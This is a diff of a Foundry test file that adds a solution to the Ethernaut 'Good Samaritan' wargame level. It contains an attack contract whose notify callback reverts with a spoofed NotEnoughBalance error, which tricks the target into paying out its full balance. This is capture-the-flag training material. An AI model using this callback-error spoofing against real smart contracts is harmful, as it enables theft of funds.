@@ -3,7 +3,7 @@
 pragma solidity ^0.8.0;
 
 import {SetUpLevelTest} from "../SetUpLevelTest.sol";
-import {GoodSamaritan, GoodSamaritanFactory} from "ethernaut/levels/GoodSamaritanFactory.sol";
+import {GoodSamaritan, GoodSamaritanFactory, INotifyable} from "ethernaut/levels/GoodSamaritanFactory.sol";
 
 contract GoodSamaritanLevel is SetUpLevelTest {
     GoodSamaritan internal goodSamaritan;
@@ -17,5 +17,23 @@ contract GoodSamaritanLevel is SetUpLevelTest {
         goodSamaritan = GoodSamaritan(instance);
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        GoodSamaritanAttack goodSamaritanAttack = new GoodSamaritanAttack();
+        goodSamaritanAttack.requestDonation(address(goodSamaritan));
+        vm.stopPrank();
+    }
+}
+
+contract GoodSamaritanAttack is INotifyable {
+    error NotEnoughBalance();
+
+    function requestDonation(address _target) public {
+        GoodSamaritan(_target).requestDonation();
+    }
+
+    function notify(uint256 amount) public pure {
+        if (amount == 10) {
+            revert NotEnoughBalance();
+        }
     }
 }
